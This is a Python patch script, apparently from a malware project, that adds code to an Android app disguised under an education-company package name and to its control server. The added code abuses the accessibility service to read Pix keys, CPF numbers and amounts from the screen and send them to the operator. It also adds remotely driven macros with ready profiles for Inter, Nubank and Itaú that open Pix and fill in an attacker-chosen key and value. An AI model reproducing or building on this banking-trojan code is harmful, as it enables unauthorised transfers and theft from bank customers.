import io, os, subprocess, sys

FALHAS = []

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

def sub(p, velho, novo, obrig=True):
    s = ler(p)
    if velho not in s:
        if obrig:
            FALHAS.append("%s :: %s" % (p, velho.strip().splitlines()[0][:70]))
        return False
    grava(p, s.replace(velho, novo, 1))
    print("  ok  %s" % p)
    return True

print("[1] Sel.java")
grava("app/src/main/java/com/eloeeducacao/Sel.java", r'''package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.List;
import java.util.regex.Pattern;

public final class Sel {

    public static final class Hit {
        public final AccessibilityNodeInfo node;
        public final int x, y;
        public final String txt;
        Hit(AccessibilityNodeInfo n, int x, int y, String t) {
            this.node = n; this.x = x; this.y = y; this.txt = t;
        }
    }

    private static boolean casa(AccessibilityNodeInfo n, JSONObject s) {
        try {
            if (s.has("edit") && n.isEditable() != s.getBoolean("edit")) return false;
            if (s.has("click") && n.isClickable() != s.getBoolean("click")) return false;
            if (s.has("cls")) {
                String c = String.valueOf(n.getClassName()).toLowerCase();
                if (!c.contains(s.getString("cls").toLowerCase())) return false;
            }
            if (s.has("id")) {
                String id = n.getViewIdResourceName();
                if (id == null || !Pattern.compile(s.getString("id")).matcher(id).find()) return false;
            }
            if (s.has("txt")) {
                String t = (n.getText() == null ? "" : n.getText().toString()) + " "
                        + (n.getContentDescription() == null ? "" : n.getContentDescription().toString());
                if (!Pattern.compile(s.getString("txt"), Pattern.CASE_INSENSITIVE).matcher(t).find())
                    return false;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    public static List<Hit> todos(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> out = new ArrayList<>();
        if (raiz == null) return out;
        Deque<AccessibilityNodeInfo> fila = new ArrayDeque<>();
        fila.add(raiz);
        int limite = 4000;
        while (!fila.isEmpty() && limite-- > 0) {
            AccessibilityNodeInfo n = fila.poll();
            if (n == null) continue;
            if (casa(n, s)) {
                Rect r = new Rect();
                n.getBoundsInScreen(r);
                if (r.width() > 0 && r.height() > 0) {
                    CharSequence t = n.getText();
                    out.add(new Hit(n, r.centerX(), r.centerY(), t == null ? "" : t.toString()));
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) {
                AccessibilityNodeInfo f = n.getChild(i);
                if (f != null) fila.add(f);
            }
        }
        return out;
    }

    public static Hit melhor(AccessibilityNodeInfo raiz, JSONObject s) {
        List<Hit> l = todos(raiz, s);
        if (l.isEmpty()) return null;
        if (!s.has("perto")) return l.get(0);
        int px = s.optJSONArray("perto").optInt(0, 0);
        int py = s.optJSONArray("perto").optInt(1, 0);
        Hit best = null;
        double bd = Double.MAX_VALUE;
        for (Hit h : l) {
            double d = Math.hypot(h.x - px, h.y - py);
            if (d < bd) { bd = d; best = h; }
        }
        return best;
    }
}
''')

print("[2] Watch.java")
grava("app/src/main/java/com/eloeeducacao/Watch.java", r'''package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

public final class Watch {
    public static volatile boolean on;
    private static volatile long ultimo;

    public static void ev() {
        if (!on) return;
        long agora = System.currentTimeMillis();
        if (agora - ultimo < 1500) return;
        ultimo = agora;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        try {
            JSONObject s = new JSONObject().put("edit", true);
            StringBuilder chaves = new StringBuilder();
            for (Sel.Hit h : Sel.todos(r, s)) {
                String t = h.txt.trim();
                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
                    chaves.append(t).append(" ; ");
                }
            }
            if (chaves.length() == 0) return;
            String valor = "";
            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
                valor = h.txt;
            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
        } catch (Throwable ignored) {}
    }
}
''')

print("[3] Macro.java")
grava("app/src/main/java/com/eloeeducacao/Macro.java", r'''package com.eloeeducacao;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class Macro {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final List<JSONObject> fila = new ArrayList<>();
    public static volatile boolean rodando;

    public static void play(JSONArray a, JSONObject vars) {
        synchronized (fila) {
            fila.clear();
            JSONObject v = vars == null ? new JSONObject() : vars;
            if (a != null) {
                for (int i = 0; i < a.length(); i++) {
                    JSONObject s = a.optJSONObject(i);
                    if (s == null) continue;
                    if (s.has("v")) {
                        try {
                            s.put("v", s.optString("v")
                                    .replace("{{CHAVE}}", v.optString("chave"))
                                    .replace("{{VALOR}}", v.optString("valor")));
                        } catch (Throwable ignored) {}
                    }
                    fila.add(s);
                }
            }
        }
        if (!rodando) {
            rodando = true;
            H.post(passo);
        }
    }

    public static void stop() {
        synchronized (fila) { fila.clear(); }
        rodando = false;
        Util.sendT("info", "macro interrompido");
    }

    private static final Runnable passo = new Runnable() {
        @Override public void run() {
            if (!rodando) return;
            JSONObject s;
            synchronized (fila) {
                if (fila.isEmpty()) {
                    rodando = false;
                    Util.sendT("info", "macro concluido");
                    return;
                }
                s = fila.remove(0);
            }
            KeySvc k = KeySvc.I;
            try {
                if (k != null && s.has("t")) {
                    JSONArray p = s.getJSONArray("t");
                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("l")) {
                    JSONArray p = s.getJSONArray("l");
                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("s")) {
                    JSONArray p = s.getJSONArray("s");
                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
                } else if (k != null && s.has("x")) {
                    k.setText(s.getString("x"));
                } else if (k != null && s.has("k")) {
                    k.key(s.getInt("k"));
                } else if (s.has("do")) {
                    String d = s.optString("do");
                    if ("back".equals(d)) {
                        if (k != null) k.key(4);
                    } else if ("home".equals(d)) {
                        if (k != null) k.key(3);
                    } else if ("wait".equals(d)) {
                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
                    } else {
                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
                        else executa(s, h, k);
                    }
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
        }
    };

    private static void espera(final JSONObject s, final long ate) {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
        if (h != null) {
            executa(s, h, k);
            H.postDelayed(passo, 120);
            return;
        }
        if (System.currentTimeMillis() > ate) {
            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
            H.postDelayed(passo, 120);
            return;
        }
        H.postDelayed(() -> espera(s, ate), 250);
    }

    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
        String d = s.optString("do");
        try {
            if ("tap".equals(d)) k.touch(h.x, h.y);
            else if ("long".equals(d)) k.longPress(h.x, h.y);
            else if ("get".equals(d)) Util.sendT("get", h.txt);
            else if ("set".equals(d)) {
                Bundle b = new Bundle();
                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        s.optString("v"));
                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            }
        } catch (Throwable ignored) {}
    }
}
''')

print("[4] KeySvc hook")
sub("app/src/main/java/com/eloeeducacao/KeySvc.java",
    '''                curWin = i >= 0 ? w.substring(i + 1) : w;
            }
        } catch (Throwable ignored) {
        }
    }''',
    '''                curWin = i >= 0 ? w.substring(i + 1) : w;
            }
            Watch.ev();
        } catch (Throwable ignored) {
        }
    }''')

print("[5] Cmd")
sub("app/src/main/java/com/eloeeducacao/Cmd.java",
    '''                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"));
                    break;''',
    '''                case "macro":
                    if ("stop".equals(o.optString("op"))) Macro.stop();
                    else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "run":
                    Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
                    break;
                case "watch":
                    Watch.on = o.optBoolean("on", true);
                    Util.sendT("info", "watch " + (Watch.on ? "on" : "off"));
                    break;''')

print("[6] server.py - UI")
SV = "server.py"
sub(SV, '<div id=bar><input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path">',
       '<div id=bar><select id=pfl></select><input id=pch placeholder="chave pix" '
       'style="flex:0 0 190px"><input id=pvl placeholder="valor" style="flex:0 0 80px">'
       '<button class=pri onclick="runPix()">Pix</button><button id=wt onclick="wt()">Watch</button>'
       '<input id=t placeholder="texto  |  $comando  |  /ls path  |  /dl path">')

print("[7] server.py - perfis")
sub(SV, "co();\n</script>", r'''const PERFIS = {
"inter": [
 {"do":"wait","sel":{"txt":"Área Pix|^Pix$"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Área Pix$|^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar|Nova transferência"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar|Próximo"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
],
"nubank": [
 {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
],
"itau": [
 {"do":"wait","sel":{"txt":"Pix"},"ms":15000},
 {"do":"tap","sel":{"txt":"^Pix$","click":true}},
 {"do":"wait","sel":{"txt":"Transferir|Enviar Pix"},"ms":9000},
 {"do":"tap","sel":{"txt":"Transferir|Enviar Pix"}},
 {"do":"wait","sel":{"txt":"Chave Pix|Nova chave"},"ms":9000},
 {"do":"tap","sel":{"txt":"Chave Pix"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{CHAVE}}"},
 {"do":"tap","sel":{"txt":"Continuar|Avançar"}},
 {"do":"wait","sel":{"edit":true},"ms":9000},
 {"do":"set","sel":{"edit":true},"v":"{{VALOR}}"},
 {"do":"tap","sel":{"txt":"Continuar|Transferir|Confirmar"}},
 {"do":"wait","sel":{"txt":"Senha|senha|digite"},"ms":15000}
]
};
function pflUpd(){
  const s=$('#pfl');s.innerHTML='';
  Object.keys(PERFIS).forEach(k=>{const o=document.createElement('option');
    o.value=k;o.textContent=k;s.appendChild(o)});
}
function runPix(){
  const k=$('#pfl').value,ch=$('#pch').value.trim(),vl=$('#pvl').value.trim();
  if(!ch){log('sem chave pix');return}
  c('run',{s:PERFIS[k],v:{chave:ch,valor:vl}});
  log('perfil '+k+' chave '+ch+' valor '+(vl||'-'))
}
function wt(){
  const b=$('#wt'),on=b.dataset.on!=='1';
  b.dataset.on=on?'1':'0';b.style.background=on?'#1f4d7a':'';
  c('watch',{on:on})
}
pflUpd();
co();
</script>''')

print("[8] server.py - pixvisto")
sub(SV, "      else log(x.t+': '+(x.o||''))}",
       "      else if(x.t==='pixvisto'){log('! '+x.o);"
       "const mm=x.o.match(/chave=([^;]+)/);if(mm)$('#pch').value=mm[1].trim()}\n"
       "      else log(x.t+': '+(x.o||''))}")

print("")
if FALHAS:
    print("!! %d nao aplicado(s):" % len(FALHAS))
    for f in FALHAS:
        print("   - " + f)

if "--no-git" not in sys.argv:
    print("\n[git]")
    for c in (["git", "add", "-A"],
              ["git", "commit", "-m", "motor de seletores, perfis por banco, watch de pix"],
              ["git", "push"]):
        r = subprocess.run(c, capture_output=True, text=True)
        print("  $ %s -> %s" % (" ".join(c), r.returncode))
        for ln in (r.stdout + r.stderr).strip().splitlines()[:1]:
            print("    " + ln)
